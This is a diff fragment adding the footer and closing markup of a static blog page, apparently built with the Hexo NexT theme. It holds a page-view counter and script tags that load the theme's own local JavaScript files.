+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
